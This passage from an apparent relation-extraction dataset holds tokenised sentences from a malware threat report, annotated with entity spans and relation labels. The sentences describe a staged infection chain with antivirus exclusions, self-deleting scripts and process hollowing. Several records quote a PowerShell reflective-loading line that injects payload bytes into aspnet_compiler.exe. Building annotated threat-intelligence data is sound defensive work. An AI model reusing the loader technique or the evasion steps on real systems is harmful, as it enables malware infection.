6, "h": 7}, {"r": "RF", "evidence": [1], "t": 6, "h": 7}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "RD", "evidence": [1, 2], "h": 7, "t": 11}, {"r": "RD", "evidence": [1, 2], "h": 7, "t": 11}, {"r": "WR", "evidence": [1, 2], "h": 7, "t": 11}, {"r": "RD", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "RD", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "RD", "evidence": [3], "t": 13, "h": 14}, {"r": "EX", "evidence": [4], "h": 15, "t": 16}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}, {"r": "FR", "evidence": [7], "h": 19, "t": 22}, {"r": "EX", "evidence": [7], "t": 21, "h": 22}, {"r": "CO", "evidence": [7], "h": 20, "t": 21}]}, {"title": "051-13", "sents": [["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."], ["A", "DLL", "named", "Hexlified", "injector", "is", "utilized", "to", "execute", "a", "certain", "process", "and", "introduce", "malware", "as", "a", "part", "of", "it", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "endpoint", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "script", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "configuration scripts", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "Script", "pos": [0, 1], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [26, 26], "name": "windir", "pos": [5, 6], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [44, 44], "name": "windir", "pos": [23, 24], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "Script", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "exclusions", "pos": [3, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "executables", "pos": [8, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "Script 3", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "Script 2", "pos": [3, 5], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "Script 4", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "Script 1", "pos": [3, 5], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "PS1 script", "pos": [4, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [129, 129], "name": "Stage 4 script", "pos": [11, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "it", "pos": [16, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "VBS script", "pos": [21, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "Hexlified injector", "pos": [3, 5], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "process", "pos": [11, 12], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "malware", "pos": [14, 15], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "RD", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "RD", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "t": 7, "h": 8}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "FR", "evidence": [6], "h": 13, "t": 16}, {"r": "EX", "evidence": [6], "t": 15, "h": 16}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}, {"r": "EX", "evidence": [7], "t": 17, "h": 18}, {"r": "IJ", "evidence": [7], "h": 18, "t": 19}]}, {"title": "051-14", "sents": [["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."], ["A", "DLL", "named", "Hexlified", "injector", "is", "utilized", "to", "execute", "a", "certain", "process", "and", "introduce", "malware", "as", "a", "part", "of", "it", "."], ["To", "load", "the", "injector", "DLL", "into", "powershell", "and", "pass", "the", "target", "process", "'", "image", "path", "and", "malware", "payload", "bytes", ",", "a", "plaintext", "or", "Base64-encoded", "command", "is", "used", ".", "The", "command", "is", "then", "reflected", "into", "the", "powershell", "process", ".", "For", "instance", ",", "this", "code", "can", "be", "used", ":", "[", "Reflection.Assembly", "]", ":", ":Load", "(", "$", "H5", ")", ".GetType", "(", "'VBNET.PE", "'", ")", ".GetMethod", "(", "'Run", "'", ")", ".Invoke", "(", "$", "null", ",", "[", "object", "[", "]", "]", "(", "'", "C", ":", "\\Windows\\", "Microsoft.NET\\", "Framework\\v4.0.30319\\aspnet_compiler.exe", "'", ",", "$", "H1", ")", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "Script", "pos": [0, 1], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [5, 5], "name": "windir", "pos": [5, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [23, 23], "name": "windir", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "Script", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "exclusions", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [52, 52], "name": "executables", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "Script 3", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "Script 2", "pos": [3, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "Script 4", "pos": [0, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "Script 1", "pos": [3, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "PS1 script", "pos": [4, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "Stage 4 script", "pos": [11, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "it", "pos": [16, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [118, 118], "name": "VBS script", "pos": [21, 23], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "Hexlified injector", "pos": [3, 5], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [132, 132], "name": "process", "pos": [11, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "malware", "pos": [14, 15], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "injector DLL", "pos": [3, 5], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [152, 152], "name": "target process ' image path", "pos": [10, 15], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [158, 158], "name": "malware payload bytes", "pos": [16, 19], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [163, 163], "name": "plaintext", "pos": [21, 22], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [165, 165], "name": "Base64-encoded", "pos": [23, 24], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "'VBNET.PE", "pos": [58, 59], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "C : \\Windows\\ Microsoft.NET\\ Framework\\v4.0.30319\\aspnet_compiler.exe", "pos": [78, 83], "index": "23_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "t": 4, "h": 5}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "FR", "evidence": [5], "h": 10, "t": 13}, {"r": "EX", "evidence": [5], "t": 12, "h": 13}, {"r": "CO", "evidence": [5], "h": 11, "t": 12}, {"r": "EX", "evidence": [6], "t": 14, "h": 15}, {"r": "IJ", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "t": 17, "h": 20}, {"r": "RD", "evidence": [7], "t": 17, "h": 21}, {"r": "WR", "evidence": [7], "t": 18, "h": 21}, {"r": "WR", "evidence": [7], "t": 19, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 21, "t": 23}]}, {"title": "051-15", "sents": [["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."], ["A", "DLL", "named", "Hexlified", "injector", "is", "utilized", "to", "execute", "a", "certain", "process", "and", "introduce", "malware", "as", "a", "part", "of", "it", "."], ["To", "load", "the", "injector", "DLL", "into", "powershell", "and", "pass", "the", "target", "process", "'", "image", "path", "and", "malware", "payload", "bytes", ",", "a", "plaintext", "or", "Base64-encoded", "command", "is", "used", ".", "The", "command", "is", "then", "reflected", "into", "the", "powershell", "process", ".", "For", "instance", ",", "this", "code", "can", "be", "used", ":", "[", "Reflection.Assembly", "]", ":", ":Load", "(", "$", "H5", ")", ".GetType", "(", "'VBNET.PE", "'", ")", ".GetMethod", "(", "'Run", "'", ")", ".Invoke", "(", "$", "null", ",", "[", "object", "[", "]", "]", "(", "'", "C", ":", "\\Windows\\", "Microsoft.NET\\", "Framework\\v4.0.30319\\aspnet_compiler.exe", "'", ",", "$", "H1", ")", ")", "."], ["During", "the", "infection", "process", ",", "some", "of", "the", "(", "mini", ")", "scripts", "utilized", "in", "Stage", "2", "are", "hosted", "independently", "and", "downloaded", "and", "executed", ".", "Minor", "variations", "are", "also", "seen", "in", "the", "infection", "chains", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Script", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "exclusions", "pos": [3, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "executables", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Script 3", "pos": [0, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "Script 2", "pos": [3, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [24, 24], "name": "Script 4", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [27, 27], "name": "Script 1", "pos": [3, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [57, 57], "name": "PS1 script", "pos": [4, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [64, 64], "name": "Stage 4 script", "pos": [11, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [69, 69], "name": "it", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "VBS script", "pos": [21, 23], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [80, 80], "name": "Hexlified injector", "pos": [3, 5], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [88, 88], "name": "process", "pos": [11, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "malware", "pos": [14, 15], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [101, 101], "name": "injector DLL", "pos": [3, 5], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [108, 108], "name": "target process ' image path", "pos": [10, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "malware payload bytes", "pos": [16, 19], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "plaintext", "pos": [21, 22], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [121, 121], "name": "Base64-encoded", "pos": [23, 24], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "'VBNET.PE", "pos": [58, 59], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [176, 176], "name": "C : \\Windows\\ Microsoft.NET\\ Framework\\v4.0.30319\\aspnet_compiler.exe", "pos": [78, 83], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "infection process", "pos": [2, 4], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "scripts", "pos": [11, 12], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 7, "t": 10}, {"r": "EX", "evidence": [4], "t": 9, "h": 10}, {"r": "CO", "evidence": [4], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "t": 11, "h": 12}, {"r": "IJ", "evidence": [5], "h": 12, "t": 13}, {"r": "RD", "evidence": [6], "t": 14, "h": 17}, {"r": "RD", "evidence": [6], "t": 14, "h": 18}, {"r": "WR", "evidence": [6], "t": 15, "h": 18}, {"r": "WR", "evidence": [6], "t": 16, "h": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "WR", "evidence": [6, 7], "t": 19, "h": 21}, {"r": "WR", "evidence": [6, 7], "t": 20, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 21, "t": 22}]}, {"title": "051-16", "sents": [["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."], ["A", "DLL", "named", "Hexlified", "injector", "is", "utilized", "to", "execute", "a", "certain", "process", "and", "introduce", "malware", "as", "a", "part", "of", "it", "."], ["To", "load", "the", "injector", "DLL", "into", "powershell", "and", "pass", "the", "target", "process", "'", "image", "path", "and", "malware", "payload", "bytes", ",", "a", "plaintext", "or", "Base64-encoded", "command", "is", "used", ".", "The", "command", "is", "then", "reflected", "into", "the", "powershell", "process", ".", "For", "instance", ",", "this", "code", "can", "be", "used", ":", "[", "Reflection.Assembly", "]", ":", ":Load", "(", "$", "H5", ")", ".GetType", "(", "'VBNET.PE", "'", ")", ".GetMethod", "(", "'Run", "'", ")", ".Invoke", "(", "$", "null", ",", "[", "object", "[", "]", "]", "(", "'", "C", ":", "\\Windows\\", "Microsoft.NET\\", "Framework\\v4.0.30319\\aspnet_compiler.exe", "'", ",", "$", "H1", ")", ")", "."], ["During", "the", "infection", "process", ",", "some", "of", "the", "(", "mini", ")", "scripts", "utilized", "in", "Stage", "2", "are", "hosted", "independently", "and", "downloaded", "and", "executed", ".", "Minor", "variations", "are", "also", "seen", "in", "the", "infection", "chains", "."], ["Several", "executables", "make", "up", "stage", "3", ":", "Injector", "DLL", "and", "malware", "payload", ".", "The", "malware", "payload", "bytes", "are", "injected", "into", "the", "hollowed", "out", "target", "process", "using", "the", "injector", "DLL", ".", "The", "DLL", "is", "a", "basic", "injector", "based", "on", ".NET", "and", "only", "has", "one", "exported", "method", "that", "deploys", "the", "malware", "payload", "into", "the", "target", "process", ".", "The", "DLL", "is", "usually", "obfuscated", "with", ".NET", "Reactor", "but", "can", "be", "deobfuscated", "with", "de4dot", ".", "Any", "errors", "during", "the", "injection", "process", "will", "cause", "the", "target", "process", "to", "be", "killed", "and", "retried", "five", "times", "before", "giving", "up", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Script 3", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "Script 2", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [6, 6], "name": "Script 4", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [9, 9], "name": "Script 1", "pos": [3, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [39, 39], "name": "PS1 script", "pos": [4, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "Stage 4 script", "pos": [11, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [51, 51], "name": "it", "pos": [16, 17], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "VBS script", "pos": [21, 23], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [62, 62], "name": "Hexlified injector", "pos": [3, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "process", "pos": [11, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "malware", "pos": [14, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [83, 83], "name": "injector DLL", "pos": [3, 5], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [90, 90], "name": "target process ' image path", "pos": [10, 15], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "malware payload bytes", "pos": [16, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "plaintext", "pos": [21, 22], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "Base64-encoded", "pos": [23, 24], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "'VBNET.PE", "pos": [58, 59], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [158, 158], "name": "C : \\Windows\\ Microsoft.NET\\ Framework\\v4.0.30319\\aspnet_compiler.exe", "pos": [78, 83], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "infection process", "pos": [2, 4], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "scripts", "pos": [11, 12], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "executables", "pos": [1, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [214, 214], "name": "malware payload", "pos": [10, 12], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [218, 218], "name": "malware payload", "pos": [14, 16], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [235, 235], "name": "DLL", "pos": [31, 32], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [242, 242], "name": ".NET", "pos": [38, 39], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [252, 252], "name": "malware payload", "pos": [48, 50], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [256, 256], "name": "target process", "pos": [52, 54], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [278, 278], "name": "injection", "pos": [74, 75], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [283, 283], "name": "target process", "pos": [79, 81], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 4, "t": 7}, {"r": "EX", "evidence": [3], "t": 6, "h": 7}, {"r": "CO", "evidence": [3], "h": 5, "t": 6}, {"r": "EX", "evidence": [4], "t": 8, "h": 9}, {"r": "IJ", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [5], "t": 11, "h": 14}, {"r": "RD", "evidence": [5], "t": 11, "h": 15}, {"r": "WR", "evidence": [5], "t": 12, "h": 15}, {"r": "WR", "evidence": [5], "t": 13, "h": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 17}, {"r": "WR", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "WR", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}, {"r": "WR", "evidence": [7], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "WR", "evidence": [7], "t": 25, "h": 26}, {"r": "WR", "evidence": [7], "t": 25, "h": 26}, {"r": "UK", "evidence": [7], "h": 27, "t": 28}, {"r": "CO", "evidence": [7], "t": 21, "h": 22}, {"r": "CO", "evidence": [7], "h": 26, "t": 28}]}, {"title": "051-17", "sents": [["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."], ["A", "DLL", "named", "Hexlified", "injector", "is", "utilized", "to", "execute", "a", "certain", "process", "and", "introduce", "malware", "as", "a", "part", "of", "it", "."], ["To", "load", "the", "injector", "DLL", "into", "powershell", "and", "pass", "the", "target", "process", "'", "image", "path", "and", "malware", "payload", "bytes", ",", "a", "plaintext", "or", "Base64-encoded", "command", "is", "used", ".", "The", "command", "is", "then", "reflected", "into", "the", "powershell", "process", ".", "For", "instance", ",", "this", "code", "can", "be", "used", ":", "[", "Reflection.Assembly", "]", ":", ":Load", "(", "$", "H5", ")", ".GetType", "(", "'VBNET.PE", "'", ")", ".GetMethod", "(", "'Run", "'", ")", ".Invoke", "(", "$", "null", ",", "[", "object", "[", "]", "]", "(", "'", "C", ":", "\\Windows\\", "Microsoft.NET\\", "Framework\\v4.0.30319\\aspnet_compiler.exe", "'", ",", "$", "H1", ")", ")", "."], ["During", "the", "infection", "process", ",", "some", "of", "the", "(", "mini", ")", "scripts", "utilized", "in", "Stage", "2", "are", "hosted", "independently", "and", "downloaded", "and", "executed", ".", "Minor", "variations", "are", "also", "seen", "in", "the", "infection", "chains", "."], ["Several", "executables", "make", "up", "stage", "3", ":", "Injector", "DLL", "and", "malware", "payload", ".", "The", "malware", "payload", "bytes", "are", "injected", "into", "the", "hollowed", "out", "target", "process", "using", "the", "injector", "DLL", ".", "The", "DLL", "is", "a", "basic", "injector", "based", "on", ".NET", "and", "only", "has", "one", "exported", "method", "that", "deploys", "the", "malware", "payload", "into", "the", "target", "process", ".", "The", "DLL", "is", "usually", "obfuscated", "with", ".NET", "Reactor", "but", "can", "be", "deobfuscated", "with", "de4dot", ".", "Any", "errors", "during", "the", "injection", "process", "will", "cause", "the", "target", "process", "to", "be", "killed", "and", "retried", "five", "times", "before", "giving", "up", "."], ["The", "DLL", "is", "a", "modified", "version", "of", "RunPE", "and", "interestingly", "includes", "unused", "code", "that", "can", "change", "ACL", "to", "kernel", "objects", ".", "This", "unused", "code", "suggests", "either", "a", "work-in-progress", "or", "redundant", "code", "borrowed", "from", "elsewhere", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Script 4", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "Script 1", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "PS1 script", "pos": [4, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "Stage 4 script", "pos": [11, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "it", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "VBS script", "pos": [21, 23], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [56, 56], "name": "Hexlified injector", "pos": [3, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "process", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "malware", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "injector DLL", "pos": [3, 5], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [84, 84], "name": "target process ' image path", "pos": [10, 15], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "malware payload bytes", "pos": [16, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "plaintext", "pos": [21, 22], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "Base64-encoded", "pos": [23, 24], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "'VBNET.PE", "pos": [58, 59], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "C : \\Windows\\ Microsoft.NET\\ Framework\\v4.0.30319\\aspnet_compiler.exe", "pos": [78, 83], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [166, 166], "name": "infection process", "pos": [2, 4], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [175, 175], "name": "scripts", "pos": [11, 12], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [199, 199], "name": "executables", "pos": [1, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [208, 208], "name": "malware payload", "pos": [10, 12], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [212, 212], "name": "malware payload", "pos": [14, 16], "index": "20_0"}], [{"type": "MF", "sent_id": 